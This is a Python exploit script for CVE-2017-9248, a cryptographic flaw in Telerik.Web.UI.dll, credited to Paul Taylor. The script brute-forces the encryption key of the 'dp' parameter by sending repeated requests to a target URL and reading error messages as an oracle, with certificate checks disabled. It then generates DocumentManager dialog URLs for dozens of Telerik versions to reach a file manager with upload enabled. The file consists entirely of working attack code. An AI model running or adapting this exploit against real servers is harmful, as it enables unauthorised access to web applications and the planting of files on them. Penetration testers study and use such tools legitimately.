#!/usr/bin/python3

# Author: Paul Taylor / @bao7uo

# https://github.com/bao7uo/dp_crypto/blob/master/dp_crypto.py

# dp_crypto - CVE-2017-9248 exploit
# Telerik.Web.UI.dll Cryptographic compromise

# Warning - no cert warnings,
# and verify = False in code below prevents verification

import sys
import base64
import requests
import re
import binascii
import argparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

requests_sent = 0
char_requests = 0


def getProxy(proxy):
    return { "http" : proxy, "https" : proxy }


def get_result(plaintext, key, session, pad_chars):
    global requests_sent, char_requests

    url = args.url
    base_pad = (len(key) % 4)
    base = '' if base_pad == 0 else pad_chars[0:4 - base_pad]
    dp_encrypted = base64.b64encode(
                                (encrypt(plaintext, key) + base).encode()
                            ).decode()
    request = requests.Request('GET', url + '?dp=' + dp_encrypted)
    request = request.prepare()
    response = session.send(request, verify=False, proxies = getProxy(args.proxy))
    requests_sent += 1
    char_requests += 1

    match = re.search("(Error Message:)(.+\n*.+)(</div>)", response.text)
    return True \
        if match is not None \
        and match.group(2) == args.oracle \
        else False

def test_keychar(keychar, found, session, pad_chars):
    base64chars = "AQgwBRhxCSiyDTjzEUk0FVl1GWm2HXn3IYo4JZp5Kaq6Lbr7Mcs8Ndt9Oeu+Pfv/"

    accuracy_thoroughness_threshold = args.accuracy
    for bc in range(int(accuracy_thoroughness_threshold)):
                                                # ^^ max is len(base64chars)
        sys.stdout.write("\b\b" + base64chars[bc] + "]")
        sys.stdout.flush()
        if not get_result(
                      base64chars[0] * len(found) + base64chars[bc],
                      found + keychar, session, pad_chars
                      ):
            return False
    return True


def encrypt(dpdata, key):
    encrypted = []
    k = 0
    for i in range(len(dpdata)):
        encrypted.append(chr(ord(dpdata[i]) ^ ord(key[k])))
        k = 0 if k >= len(key) - 1 else k + 1
    return ''.join(str(e) for e in encrypted)


def mode_decrypt():
    ciphertext = base64.b64decode(args.ciphertext).decode()
    key = args.key
    print(base64.b64decode(encrypt(ciphertext, key)).decode())
    print("")


def mode_encrypt():
    plaintext = args.plaintext
    key = args.key

    plaintext = base64.b64encode(plaintext.encode()).decode()
    print(base64.b64encode(encrypt(plaintext, key).encode()).decode())
    print("")


def test_keypos(key_charset, unprintable, found, session):
    pad_chars = ''
    pad_list = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]
    for pad_char in pad_list:
        pad_chars += chr(pad_char)

    for i in range(len(pad_chars)):
        for k in range(len(key_charset)):
            keychar = key_charset[k]
            sys.stdout.write("\b"*6)
            sys.stdout.write(
                        (
                            keychar
                            if unprintable is False
                            else '+'
                        ) +
                        ") [" + (
                            keychar
                            if unprintable is False
                            else '+'
                        ) +
                        "]"
                    )
            sys.stdout.flush()
            if test_keychar(keychar, found, session, pad_chars[i] * 3):
                return keychar
    return False


def get_key(session):
    global char_requests
    found = ''
    unprintable = False

    key_length = args.key_len
    key_charset = args.charset
    if key_charset == 'all':
        unprintable = True
        key_charset = ''
        key_chars = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26,
                    27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,
                    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76,
                    77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100,
                    101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120,
                    121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140,
                    141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160,
                    161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180,
                    181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200,
                    201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220,
                    221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240,
                    241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]

        for i in key_chars:
            key_charset += chr(i)
    else:
        if key_charset == 'hex':
            key_charset = '01234567890ABCDEF'

    print("Attacking " + args.url)
    print(
        "to find key of length [" +
        str(key_length) +
        "] with accuracy threshold [" +
        str(args.accuracy) +
        "]"
    )
    print(
        "using key charset [" +
        (
            key_charset
            if unprintable is False
            else '- all ASCII -'
        ) +
        "]\n"
    )
    for i in range(int(key_length)):
        pos_str = (
            str(i + 1)
            if i > 8
            else "0" + str(i + 1)
        )
        sys.stdout.write("Key position " + pos_str + ": (------")
        sys.stdout.flush()
        keychar = test_keypos(key_charset, unprintable, found, session)
        if keychar is not False:
            found = found + keychar
            sys.stdout.write(
                          "\b"*7 + "{" +
                          (
                              keychar
                              if unprintable is False
                              else '0x' + binascii.hexlify(keychar.encode()).decode()
                          ) +
                          "} found with " +
                          str(char_requests) +
                          " requests, total so far: " +
                          str(requests_sent) +
                          "\n"
                      )
            sys.stdout.flush()
            char_requests = 0
        else:
            sys.stdout.write("\b"*7 + "Not found, quitting\n")
            sys.stdout.flush()
            break
    if keychar is not False:
        print("Found key: " +
              (
                found
                if unprintable is False
                else "(hex) " + binascii.hexlify(found.encode()).decode()
              )
              )
    print("Total web requests: " + str(requests_sent))
    return found


def mode_brutekey():
    session = requests.Session()
    found = get_key(session)

    if found == '':
        return
    else:
        urls = {}
        url_path = args.url
        params = (
                    '?DialogName=DocumentManager' +
                    '&renderMode=2' +
                    '&Skin=Default' +
                    '&Title=Document%20Manager' +
                    '&dpptn=' +
                    '&isRtl=false' +
                    '&dp='
                  )
        versions = [
                    '2007.1423', '2007.1521', '2007.1626', '2007.2918',
                    '2007.21010', '2007.21107', '2007.31218', '2007.31314',
                    '2007.31425', '2008.1415', '2008.1515', '2008.1619',
                    '2008.2723', '2008.2826', '2008.21001', '2008.31105',
                    '2008.31125', '2008.31314', '2009.1311', '2009.1402',
                    '2009.1527', '2009.2701', '2009.2826', '2009.31103',
                    '2009.31208', '2009.31314', '2010.1309', '2010.1415',
                    '2010.1519', '2010.2713', '2010.2826', '2010.2929',
                    '2010.31109', '2010.31215', '2010.31317', '2011.1315',
                    '2011.1413', '2011.1519', '2011.2712', '2011.2915',
                    '2011.31115', '2011.3.1305', '2012.1.215', '2012.1.411',
                    '2012.2.607', '2012.2.724', '2012.2.912', '2012.3.1016',
                    '2012.3.1205', '2012.3.1308', '2013.1.220', '2013.1.403',
                    '2013.1.417', '2013.2.611', '2013.2.717', '2013.3.1015',
                    '2013.3.1114', '2013.3.1324', '2014.1.225', '2014.1.403',
                    '2014.2.618', '2014.2.724', '2014.3.1024', '2015.1.204',
                    '2015.1.225', '2015.1.401', '2015.2.604', '2015.2.623',
                    '2015.2.729', '2015.2.826', '2015.3.930', '2015.3.1111',
                    '2016.1.113', '2016.1.225', '2016.2.504', '2016.2.607',
                    '2016.3.914', '2016.3.1018', '2016.3.1027', '2017.1.118',
                    '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711',
                    '2017.3.913'
                    ]

        plaintext1 = 'EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,'
        plaintext2_raw1 = 'Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version='
        plaintext2_raw3 = ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'
        plaintext3 = ';AllowMultipleSelection,False,3,False'

        if len(args.version) > 0:
            versions = [args.version]

        for version in versions:
            plaintext2_raw2 = version
            plaintext2 = base64.b64encode(
                            (plaintext2_raw1 +
                                plaintext2_raw2 +
                                plaintext2_raw3
                             ).encode()
                        ).decode()
            plaintext = plaintext1 + plaintext2 + plaintext3
            plaintext = base64.b64encode(
                            plaintext.encode()
                        ).decode()
            ciphertext = base64.b64encode(
                            encrypt(
                                plaintext,
                                found
                            ).encode()
                        ).decode()
            full_url = url_path + params + ciphertext
            urls[version] = full_url

        found_valid_version = False
        for version in urls:
            url = urls[version]
            request = requests.Request('GET', url)
            request = request.prepare()
            response = session.send(request, verify=False, proxies=getProxy(args.proxy))
            if response.status_code == 500:
                continue
            else:
                match = re.search(
                    "(Error Message:)(.+\n*.+)(</div>)",
                    response.text
                    )
                if match is None:
                    print(version + ": " + url)
                    found_valid_version = True
                    break

        if not found_valid_version:
            print("No valid version found")

def mode_samples():
    print("Samples for testing decryption and encryption functions:")
    print("-d ciphertext key")
    print("-e plaintext key")
    print("")
    print("Key:")
    print("DC50EEF37087D124578FD4E205EFACBE0D9C56607ADF522D")
    print("")
    print("Plaintext:")
    print("EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,VGVsZXJpay5XZWIuVUkuRWRpdG9yLkRpYWxvZ0NvbnRyb2xzLkRvY3VtZW50TWFuYWdlckRpYWxvZywgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxNi4yLjUwNC40MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0;AllowMultipleSelection,False,3,False")
    print("")
    print("Ciphertext:")
    print("FhQAWBwoPl9maHYCJlx8YlZwQDAdYxRBYlgDNSJxFzZ9PUEWVlhgXHhxFipXdWR0HhV3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMLciMVMnN9AFJ0Z2EDWG4sPCpnZQMtHhRnWx8SFHBuaHZbEQJgAVdwbjwlcxNeVHY9ARgUOj9qF045eXBkSVMWEXFgX2QxHgRjSRESf1htY0BwHWZKTm9kTz8IcAwFZm0HNSNxBC5lA39zVH57Q2EJDndvYUUzCAVFRBw/KmJiZwAOCwB8WGxvciwlcgdaVH0XKiIudz98Ams6UWFjQ3oCPBJ4X0EzHXJwCRURMnVVXX5eJnZkcldgcioecxdeanMLNCAUdz98AWMrV354XHsFCTVjenh1HhdBfhwdLmVUd0BBHWZgc1RgQCoRBikEamY9ARgUOj9qF047eXJ/R3kFIzF4dkYJJnF7WCcCKgVuaGpHJgMHZWxvaikIcR9aUn0LKg0HAzZ/dGMzV3Fgc1QsfXVWAGQ9FXEMRSECEEZTdnpOJgJoRG9wbj8SfClFamBwLiMUFzZiKX8wVgRjQ3oCM3FjX14oIHJ3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMDMBEXNg9TdXcxVGEDZVVyEixUcUoDHRRNSh8WMUl7dWJfJnl8WHoHbnIgcxNLUlgDNRMELi1SAwAtVgd0WFMGIzVnX3Q3J3FgQwgGMQRjd35CHgJkXG8FbTUWWQNBUwcQNQwAOiRmPmtzY1psfmcVMBNvZUooJy5ZQgkuFENuZ0BBHgFgWG9aVDMlbBdCUgdxMxMELi1SAwAtY35aR20UcS5XZWc3Fi5zQyZ3E0B6c0BgFgBoTmJbUA0ncwMHfmMtJxdzLnRmKG8xUWB8aGIvBi1nSF5xEARBYyYDKmtSeGJWCXQHBmxaDRUhYwxLVX01CyByCHdnEHcUUXBGaHkVBhNjAmh1ExVRWycCCEFiXnptEgJaBmJZVHUeBR96ZlsLJxYGMjJpHFJyYnBGaGQZEhFjZUY+FxZvUScCCEZjXnpeCVtjAWFgSAQhcXBCfn0pCyAvFHZkL3RzeHMHdFNzIBR4A2g+HgZdZyATNmZ6aG5WE3drQ2wFCQEnBD12YVkDLRdzMj9pEl0MYXBGaVUHEi94XGA3HS5aRyAAd0JlXQltEgBnTmEHagAJX3BqY1gtCAwvBzJ/dH8wV3EPA2MZEjVRdV4zJgRjZB8SPl9uA2pHJgMGR2dafjUnBhBBfUw9ARgUOj9qFQR+")
    print("")


def mode_b64e():
    print(base64.b64encode(args.parameter.encode()).decode())
    print("")


def mode_b64d():
    print(base64.b64decode(args.parameter.encode()).decode())
    print("")

sys.stderr.write(
              "\ndp_crypto by Paul Taylor / @bao7uo\nCVE-2017-9248 - " +
              "Telerik.Web.UI.dll Cryptographic compromise\n\n"
            )

p = argparse.ArgumentParser()
subparsers = p.add_subparsers()

decrypt_parser = subparsers.add_parser('d', help='Decrypt a ciphertext')
decrypt_parser.set_defaults(func=mode_decrypt)
decrypt_parser.add_argument('ciphertext', action='store', type=str, default='', help='Ciphertext to decrypt')
decrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')

encrypt_parser = subparsers.add_parser('e', help='Encrypt a plaintext')
encrypt_parser.set_defaults(func=mode_encrypt)
encrypt_parser.add_argument('plaintext', action='store', type=str, default='', help='Ciphertext to decrypt')
encrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')

brute_parser = subparsers.add_parser('k', help='Bruteforce key/generate URL')
brute_parser.set_defaults(func=mode_brutekey)
brute_parser.add_argument('-u', '--url', action='store', type=str, help='Target URL')
brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, OPTIONAL: default is 48')
brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='The oracle text to use. OPTIONAL: default value is for english version, other languages may have other error message')
brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='OPTIONAL. Specify the version to use rather than iterating over all of them')
brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, or user defined. OPTIONAL: default is hex')
brute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy is out of 64 where 64 is the most accurate, \
    accuracy of 9 will usually suffice for a hex, but 21 or more might be needed when testing all ascii characters. Increase the accuracy argument if no valid version is found. OPTIONAL: default is 9.')
brute_parser.add_argument('-p', '--proxy', action='store', type=str, default='', help='Specify OPTIONAL proxy server, e.g. 127.0.0.1:8080')

encode_parser = subparsers.add_parser('b', help='Encode parameter to base64')
encode_parser.set_defaults(func=mode_b64e)
encode_parser.add_argument('parameter', action='store', type=str, help='Parameter to encode')

decode_parser = subparsers.add_parser('p', help='Decode base64 parameter')
decode_parser.set_defaults(func=mode_b64d)
decode_parser.add_argument('parameter', action='store', type=str, help='Parameter to decode')

args = p.parse_args()

if len(sys.argv) > 2:
    args.func()
